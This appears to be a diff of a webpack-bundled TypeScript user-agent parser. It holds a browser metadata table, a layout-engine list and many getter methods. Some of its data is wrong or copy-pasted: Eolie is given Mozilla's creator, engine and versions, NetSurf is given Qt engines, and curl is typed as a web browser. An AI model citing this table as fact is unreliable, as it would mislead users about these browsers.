+                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "name": "built nightly",
+                        "link": "https:\/\/chromium.woolyss.com\/"
+                    }
+                ]
+            },
+            "Comodo_Dragon": {
+                "name": "Comodo Dragon",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Comodo Group",
+                        "link": "https:\/\/www.comodo.com\/home\/browsers-toolbars\/internet-products.php"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "BSD",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "83.0.4103.116",
+                        "date": "July 21, 2020"
+                    }
+                ]
+            },
+            "IceDragon": {
+                "name": "Comodo Ice Dragon",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Comodo Group",
+                        "link": "https:\/\/www.comodo.com\/home\/browsers-toolbars\/internet-products.php"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MPL 2.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Gecko",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "65.0.2.15",
+                        "date": "June 19, 2019"
+                    }
+                ]
+            },
+            "Dillo": {
+                "name": "Dillo",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "The Dillo team",
+                        "link": "https:\/\/www.dillo.org\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "custom"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "3.0.5",
+                        "date": "30 June 2015"
+                    }
+                ]
+            },
+            "Dooble": {
+                "name": "Dooble",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Dooble Project Team",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Dooble"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "BSD",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "2020.10.10",
+                        "date": "October 10, 2020"
+                    }
+                ]
+            },
+            "ELinks": {
+                "name": "ELinks",
+                "type": "Web Browser",
+                "ui": "TextBasedMode",
+                "creator": [
+                    {
+                        "name": "Baudis, Fonseca, et al.",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/ELinks"
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "custom",
+                        "note": "fork of Links"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "0.11.7",
+                        "date": "22 August 2009"
+                    }
+                ]
+            },
+            "Epiphany": {
+                "name": "GNOME Web",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Marco Pesenti Gritti",
+                        "link": "https:\/\/www.gnome.org\/news\/2015\/05\/goodbye-marco\/"
+                    },
+                    {
+                        "name": "The GNOME Project",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/The_GNOME_Project"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "WebKitGTK",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKitGTK"
+                    }
+                ],
+                "latest-release": {
+                    "Stable release": {
+                        "version": "3.38.1",
+                        "date": "8 October 2020"
+                    },
+                    "Preview release": {
+                        "version": "3.37.92",
+                        "date": "13 September 2020"
+                    }
+                }
+            },
+            "Links": {
+                "name": "Links",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Patocka, et al",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Links_(web_browser)"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "custom"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "2.21",
+                        "date": "2 August 2020"
+                    }
+                ]
+            },
+            "Flock": {
+                "name": "Flock",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Flock Inc",
+                        "link": [
+                            "https:\/\/web.archive.org\/web\/20110325151017\/http:\/\/www.flock.com\/",
+                            "https:\/\/en.wikipedia.org\/wiki\/Flock_(web_browser)"
+                        ]
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "Proprietary",
+                        "note": "(as of 3.0)",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "WebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "3.5.3.4641",
+                        "date": "February 1, 2011"
+                    }
+                ]
+            },
+            "Waterfox": {
+                "name": "Waterfox Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Alex Kontos"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Gecko",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "2020.10",
+                        "date": "21 October 2020"
+                    }
+                ]
+            },
+            "Eolie": {
+                "name": "Eolie Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Mozilla Foundation",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Foundation"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MPL 2.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Gecko",
+                        "note": "(before v57)",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    },
+                    {
+                        "name": "Gecko w\/Servo",
+                        "note": "v57 & after",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Servo_(software)"
+                    }
+                ],
+                "latest-release": {
+                    "Standard": {
+                        "version": "82.0",
+                        "date": "October 20, 2020"
+                    },
+                    "Extended Support Release": {
+                        "version": "78.4.0",
+                        "date": "October 20, 2020"
+                    }
+                }
+            },
+            "PaleMoon": {
+                "name": "PaleMoon Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Moonchild Productions"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MPL 2.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Goanna",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Goanna_(software)"
+                    }
+                ],
+                "latest-release": {
+                    "Standard": {
+                        "version": "28.15.0",
+                        "date": "27 October 2020"
+                    }
+                }
+            },
+            "SeaMonkey": {
+                "name": "SeaMonkey Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "SeaMonkey Council"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MPL 2.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Gecko",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Stable release": {
+                        "version": "2.53.4",
+                        "date": "September 22, 2020"
+                    },
+                    "Preview release": {
+                        "version": "2.53.5b1",
+                        "date": "October 29, 2020"
+                    }
+                }
+            },
+            "SalamWeb": {
+                "name": "SalamWeb Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "SalamWeb",
+                        "link": "https:\/\/salamweb.com\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Freeware",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Windows": {
+                        "version": "4.5",
+                        "date": "July 31, 2020"
+                    },
+                    "Android": {
+                        "version": "4.5.0.40",
+                        "date": "June 25, 2020"
+                    },
+                    "macOS": {
+                        "version": "4.5",
+                        "date": "June 20, 2020"
+                    },
+                    "iOS": {
+                        "version": "4.5",
+                        "date": "June 20, 2020"
+                    }
+                }
+            },
+            "firefox": {
+                "name": "Firefox Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Mozilla Foundation",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Foundation"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MPL 2.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Gecko",
+                        "note": "(before v57)",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    },
+                    {
+                        "name": "Gecko w\/Servo",
+                        "note": "v57 & after",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Servo_(software)"
+                    }
+                ],
+                "latest-release": {
+                    "Standard": {
+                        "version": "82.0",
+                        "date": "October 20, 2020"
+                    },
+                    "Extended Support Release": {
+                        "version": "78.4.0",
+                        "date": "October 20, 2020"
+                    }
+                }
+            },
+            "Galeon": {
+                "name": "Galeon Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Marco Pesenti Gritti",
+                        "link": "https:\/\/www.gnome.org\/news\/2015\/05\/goodbye-marco\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Gecko",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "2.0.7",
+                        "date": "27 September 2008"
+                    }
+                ]
+            },
+            "iCab": {
+                "name": "iCab Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Alexander Clauss",
+                        "link": "https:\/\/www.clauss-net.de\/"
+                    }
+                ],
+                "cost": "Free, $20 (Pro)",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Proprietary (browser)",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    },
+                    {
+                        "name": "LGPL (WebKit)",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "WebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "5.9.2",
+                        "date": "March 4, 2020"
+                    }
+                ]
+            },
+            "curl": {
+                "name": "Client URL",
+                "type": "Web Browser",
+                "ui": "FullTextMode",
+                "creator": [
+                    {
+                        "name": "Daniel Stenberg",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Daniel_Stenberg"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Free Software: MIT\/X derivate license",
+                        "link": "https:\/\/curl.haxx.se\/docs\/copyright.html"
+                    }
+                ],
+                "latest-release": {
+                    "Stable release": {
+                        "version": "7.73.0",
+                        "date": "14 October 2020"
+                    }
+                }
+            },
+            "Lynx": {
+                "name": "Lynx",
+                "type": "FTP client \/ HTTP client",
+                "ui": "TextBasedMode",
+                "creator": [
+                    {
+                        "name": "Montulli, Grobe, Rezac, et al"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "custom, fork of libwww",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Libwww"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "2.8.9rel.1",
+                        "date": "8 July 2018"
+                    }
+                ]
+            },
+            "msie": "msie",
+            "Midori": {
+                "name": "Midori Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Christian Dywan, et al.",
+                        "link": "https:\/\/astian.org\/en\/midori-browser\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "LGPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "WebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
+                    }
+                ],
+                "latest-release": {
+                    "Stable release": [],
+                    "Preview release": {
+                        "version": "9.0",
+                        "date": "July 29, 2019"
+                    }
+                }
+            },
+            "NetSurf": {
+                "name": "NetSurf Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "The NetSurf Developers",
+                        "link": "http:\/\/www.netsurf-browser.org\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Qt WebEngine",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Qt_WebEngine"
+                    },
+                    {
+                        "name": "QtWebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/QtWebKit"
+                    }
+                ],
+                "latest-release": {
+                    "Stable release": {
+                        "version": "3.10",
+                        "date": "May 24, 2020"
+                    },
+                    "Preview release": []
+                }
+            },
+            "Otter": {
+                "name": "Otter Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Micha\u0142 Dutkiewicz",
+                        "link": "https:\/\/otter-browser.org\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPLv3",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Qt WebEngine",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Qt_WebEngine"
+                    },
+                    {
+                        "name": "QtWebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/QtWebKit"
+                    }
+                ],
+                "latest-release": {
+                    "Stable release": {
+                        "version": "1.0.01",
+                        "date": "1 January 2019"
+                    },
+                    "Preview release": {
+                        "version": "weekly333",
+                        "date": "May 18, 2020"
+                    }
+                }
+            },
+            "Maxthon": {
+                "name": "Maxthon Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Maxthon International Ltd",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Maxthon"
+                    }
+                ],
+                "cost": "\tFree",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Freeware",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "WebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
+                    },
+                    {
+                        "name": "Trident",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(layout_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Windows": {
+                        "version": "5.3.8.2000",
+                        "date": "October 25, 2019"
+                    },
+                    "Android": {
+                        "version": "5.2.3.3241",
+                        "date": "January 25, 2019"
+                    },
+                    "macOS": {
+                        "version": "5.1.60",
+                        "date": "August 27, 2018"
+                    },
+                    "iOS": {
+                        "version": "5.4.5",
+                        "date": "July 21, 2020"
+                    },
+                    "Windows Phone": {
+                        "version": "2.2.0",
+                        "date": "March 30, 2017"
+                    },
+                    "Linux": {
+                        "version": "1.0.5.3",
+                        "date": "September 9, 2014"
+                    }
+                }
+            },
+            "safari": {
+                "name": "safari Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Apple Inc.",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Apple_Inc."
+                    }
+                ],
+                "cost": "Included with macOS and iOS",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Proprietary (browser)",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    },
+                    {
+                        "name": "LGPL (WebKit) ",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "WebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
+                    }
+                ],
+                "latest-release": {
+                    "macOS": {
+                        "version": "14.0",
+                        "date": "September 17, 2020"
+                    },
+                    "iOS": {
+                        "version": "14.0",
+                        "date": "September 17, 2020"
+                    }
+                }
+            }
+        };
+        /*Web Browser Layout engines List*/ /*
+             * Layout engines
+             *
+             * Gecko is developed by the Mozilla Foundation.
+             * Goanna is a fork of Gecko developed by Moonchild Productions.
+             * KHTML is developed by the KDE project.
+             * Presto was developed by Opera Software for use in Opera. Development stopped as Opera transitioned to Blink.
+             * Tasman was developed by Microsoft for use in Internet Explorer 5 for Macintosh.
+             * Trident is developed by Microsoft for use in the Windows versions of Internet Explorer 4 to Internet Explorer 11.
+             * EdgeHTML is the engine developed by Microsoft for Edge. It is a largely rewritten fork of Trident with all legacy code removed.
+             * WebKit is a fork of KHTML by Apple Inc. used in Apple Safari, and formerly in Chromium and Google Chrome.
+             * Blink is a 2013 fork of WebKit's WebCore component by Google used in Chromium, Google Chrome, Microsoft Edge, Opera, and Vivaldi.[19]
+             * Servo is an experimental web browser layout engine being developed cooperatively by Mozilla and Samsung.*/
+        this.webBrowserLayoutList = {
+            "EdgeHTML": {
+                "name": "EdgeHTML",
+                "developer": "Microsoft",
+                "contain": "Edg",
+                "contain_example": "Edge\/xyz"
+            },
+            "Blink": {
+                "name": "Blink",
+                "developer": "Google",
+                "contain": "Chrome",
+                "contain_example": "Chrome\/xyz"
+            },
+            "Gecko": {
+                "name": "Gecko",
+                "developer": "Mozilla Foundation",
+                "contain": "Gecko",
+                "contain_example": "Gecko\/xyz"
+            },
+            "Goanna": {
+                "name": "Goanna",
+                "developer": "Moonchild Productions",
+                "contain": "Goanna",
+                "contain_example": "Goanna\/xyz"
+            },
+            "KHTML": {
+                "name": "KHTML",
+                "developer": "KDE project",
+                "contain": "KHTML",
+                "contain_example": "KHTML\/xyz"
+            },
+            "Presto": {
+                "name": "Presto",
+                "developer": "Opera Software",
+                "contain": "Opera",
+                "contain_example": "Opera\/xyz"
+            },
+            "Tasman": {
+                "name": "Tasman",
+                "developer": "Microsoft",
+                "contain": "Tasman",
+                "contain_example": "Tasman\/xyz"
+            },
+            "Trident": {
+                "name": "Trident",
+                "developer": "Microsoft",
+                "contain": "Trident",
+                "contain_example": "Trident\/xyz"
+            },
+            "WebKit": {
+                "name": "WebKit",
+                "developer": "Apple Inc",
+                "contain": "AppleWebKit",
+                "contain_example": "AppleWebKit\/xyz"
+            },
+            "Servo": {
+                "name": "Servo",
+                "developer": "cooperatively by Mozilla and Samsung",
+                "contain": "Servo",
+                "contain_example": "Servo\/xyz"
+            },
+            "libwww-FM": {
+                "name": "libwww-FM",
+                "developer": "Tim Berners-Lee",
+                "contain": "libwww-FM",
+                "contain_example": "libwww-FM\/xyz"
+            }
+        };
+        /*Parent App of Browser*/
+        this.webBrowserAppCodeNameList = [{ 'name': 'mozilla', 'code': 'Mozilla' }];
+        /** update db
+         *
+         * const self = this;
+         /!*devices list*!/
+         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-list.json", function (updatedList: any) {
+            self.devicesList = updatedList;
+        });
+         /!*device's architecture list*!/
+         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-architecture-list.json", function (updatedList: any) {
+            self.devicesArchitectureList = updatedList;
+        });
+         /!*devices category list*!/
+         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-category-list.json", function (updatedList: any) {
+            self.devicesCategoryList = updatedList;
+        });
+         /!*devices platform window manager list*!/
+         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-platform-wmn-list.json", function (updatedList: any) {
+            self.devicesPlatformWMNameList = updatedList;
+        });
+         /!*browsers list*!/
+         this.GetUpdatedData("http://localhost/libraries/json/browser-all-list.json", function (updatedList: any) {
+            self.webBrowserList = updatedList;
+        });
+         /!*browsers app code list*!/
+         this.GetUpdatedData("http://localhost/libraries/json/browser-app-code-list.json", function (updatedList: any) {
+            self.webBrowserAppCodeNameList = updatedList;
+        });
+         /!*browsers layout list*!/
+         this.GetUpdatedData("http://localhost/libraries/json/browser-layout-list.json", function (updatedList: any) {
+            self.webBrowserAppCodeNameList = updatedList;
+        });*/
+        this.analyze();
+    }
+    /*private GetUpdatedData(Url: string, callback: any) {
+        sendRequest({
+            method: "POST",
+            url: Url,
+            async: true,
+        }, function (data: any) {
+            try {
+                if (JSON.parse(data)) {
+                    if (callback) {
+                        callback(JSON.parse(data));
+                    }
+                }
+            } catch (e) {
+                console.error("Unable to retrieve data from " + Url);
+                console.error(e);
+            }
+        });
+    }*/
+    analyze() {
+        /*start operation*/
+        const self = this;
+        let cleanUA = self.cleanUserAgentString(this.UserAgent);
+        /*first step*/
+        if (Array.isArray(self.webBrowserAppCodeNameList)) {
+            self.webBrowserAppCodeNameList.forEach((value) => {
+                /*search app code form user-agent*/
+                if (cleanUA.indexOf(value.name.toLowerCase()) !== -1) {
+                    self.browserAppName = value.code;
+                    /*split user-agent in to array by space*/
+                    cleanUA.split(" ").forEach(function (item) {
+                        if (item.indexOf(value.name.toLowerCase()) !== -1) {
+                            self.browserAppNameFull = item.replace("/", " ").replace(value.name, value.code);
+                            console.log(self.browserAppNameFull);
+                            self.browserAppVersion = item.substr(value.name.toLowerCase().length + 1, (item.length - (value.name.toLowerCase().length + 1)));
+                            console.log(self.browserAppVersion);
+                        }
+                    });
+                }
+            });
+        }
+        /*second step*/
+        /*self.devicesPlatformWMNameList.forEach(function (wm:any){
+
+        })*/
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getURLProtocol() {
+        return this.URLProtocol;
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getURLHostname() {
+        return this.URLHostname;
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getURLPath() {
+        return this.URLPath;
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getURLPathFull() {
+        return this.URLPathFull;
+    }
+    /**
+     * @public
+     * @return number
+     */
+    gerDeviceScreenHeight() {
+        return this.DeviceScreenHeight;
+    }
+    /**
+     * @public
+     * @return number
+     */
+    gerDeviceScreenWidth() {
+        return this.DeviceScreenWidth;
+    }
+    /**
+     * @public
+     * @return number
+     */
+    gerDeviceScreenColorDepth() {
+        return this.DeviceScreenColorDepth;
+    }
+    /**
+     * @public
+     * @return number
+     */
+    gerDeviceScreenPixelDepth() {
+        return this.DeviceScreenPixelDepth;
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getDeviceWmNameOriginal() {
+        return this.deviceWmNameOriginal;
+    }
+    /**
+     * @public
+     * @return array
+     */
+    getDeviceInfoAll() {
+        return this.deviceInfoAll;
+    }
+    /**
+     * @public
+     * @return mixed
+     */
+    getUserAgent() {
+        return this.UserAgent;
+    }
+    getDeviceList() {
+        return this.devicesList;
+    }
+    getArchitectureList() {
+        return this.devicesArchitectureList;
+    }
+    getBrowserAppCodeNameList() {
+        return this.webBrowserAppCodeNameList;
+    }
+    getWebBrowserList() {
+        return this.webBrowserList;
+    }
+    getWebBrowserLayoutList() {
+        return this.webBrowserLayoutList;
+    }
+    getPlatformWMNameList() {
+        return this.devicesPlatformWMNameList;
+    }
+    getDevicesCategoryList() {
+        return this.devicesCategoryList;
+    }
+    /**
+     * @public
+     * @return array
+     */
+    getUserAgentList() {
+        return this.UserAgentList;
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserEngineName() {
+        return (this.browserEngineName).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserEngineNameFull() {
+        return (this.browserEngineNameFull).trim();
+    }
+    /**
+     * @public
+     * @return array
+     */
+    getBrowserInfoAll() {
+        return this.browserInfoAll;
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserAppCodeName() {
+        return (this.browserAppCodeName).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserAppCodeVersion() {
+        return (this.browserAppCodeVersion).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserAppName() {
+        return (this.browserAppName).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserAppCodeNameFull() {
+        return (this.browserAppName).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserAppVersion() {
+        return (this.browserAppVersion).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserArchitecture() {
+        return (this.browserArchitecture).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserEngineVersion() {
+        return (this.browserEngineVersion).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserName() {
+        return (this.browserName).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserNameFull() {
+        return (this.browserNameFull).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserVersion() {
+        return (this.browserVersion).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getBrowserVersionFull() {
+        return (this.browserVersionFull).trim();
+    }
+    /**
+     * @public
+     * @return mixed
+     */
+    getCurrentDeviceInfo() {
+        return this.currentDeviceInfo;
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getDeviceName() {
+        return (this.deviceName).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getDeviceNameFull() {
+        return (this.deviceNameFull).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getDeviceNameOriginal() {
+        return (this.deviceNameOriginal).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getDeviceType() {
+        return (this.deviceType).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getDeviceArchitecture() {
+        return (this.deviceArchitecture).trim();
+    }
+    /**
+     * @public
+     * @return string
+     */
+    getDeviceWindowManager() {
+        return (this.deviceWindowManager).trim();
+    }
+    gtDeviceDetails(resources) {
+        //array_change_key_case($age,CASE_UPPER)
+        if (Array.isArray(resources) && (resources).length > 0) {
+            if ('Platform' in resources) {
+                this.currentDeviceInfo = resources['Platform'];
+                this.deviceName = resources['Platform']['name'];
+                this.deviceArchitecture = resources['Platform']['architecture'];
+                this.deviceType = resources['Device']['type'];
+            }
+            else {
+                if (typeof resources === 'string') {
+                    this.deviceName = resources;
+                    this.deviceType = resources;
+                    this.currentDeviceInfo = resources;
+                }
+            }
+        }
+    }
+    getPlatformName() {
+        return this.deviceName;
+    }
+    getPlatformArchitecture() {
+        return this.deviceArchitecture;
+    }
+    cleanUserAgentString(UserAgent) {
+        // clean up the string
+        // replace browser names with their aliases
+        return UserAgent.toLowerCase().trim().replace('opr', 'opera').replace('iceweasel', 'firefox');
+    }
+}
+
+
+/***/ }),
+
+/***/ "./Assets/typescripts/common/app-common-required-send.ts":
+/*!***************************************************************!*\
+  !*** ./Assets/typescripts/common/app-common-required-send.ts ***!
+  \***************************************************************/
+/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+
+__webpack_require__.r(__webpack_exports__);
